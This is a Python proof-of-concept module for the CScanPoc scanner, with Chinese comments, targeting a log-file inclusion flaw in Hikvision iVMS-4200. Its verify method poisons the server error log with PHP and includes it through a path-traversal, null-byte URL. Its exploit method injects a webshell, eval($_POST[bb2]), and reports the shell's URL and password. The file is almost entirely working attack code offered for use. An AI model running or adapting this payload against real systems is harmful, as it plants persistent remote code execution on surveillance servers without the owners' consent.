# coding: utf-8
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Hikvision_0101'  # 平台漏洞编号，留空
    name = 'Hikvision /Server/logs/error.log 文件包含GETSHELL'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2014-11-21'  # 漏洞公布时间
    desc = '''
    海康威视IVMS系列的监控客户端，不过大部分在内网。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源http://wooyun.org/bugs/wooyun-2010-072453
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hikvision'  # 漏洞应用名称
    product_version = 'iVMS-4200'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '418fdff3-a8d0-427e-86d6-51ebee9c6ee7'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = self.target + '/<?echo(md5(bb2))?>'
            test_url = self.target + '/index.php?controller=../../../../Server/logs/error.log%00.php'
            try:
                urllib.request.urlopen(verify_url)
            except urllib.error.HTTPError as e:
                if e.code == 500:
                    content = urllib.request.urlopen(test_url).read()
                    if '0c72305dbeb0ed430b79ec9fc5fe8505' in content:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            verify_url = self.target + '/<?echo(md5(bb2));eval($_POST[bb2])?>'
            test_url = self.target + '/index.php?controller=../../../../Server/logs/error.log%00.php'
            try:
                urllib.request.urlopen(verify_url)
            except urllib.error.HTTPError as e:
                if e.code == 500:
                    content = urllib.request.urlopen(test_url).read()
                    if '0c72305dbeb0ed430b79ec9fc5fe8505' in content:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞;获取信息:webshell={webshell},password=bb2'.format(
                            target=self.target, name=self.vuln.name, webshell=test_url))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))


if __name__ == '__main__':
    Poc().run()
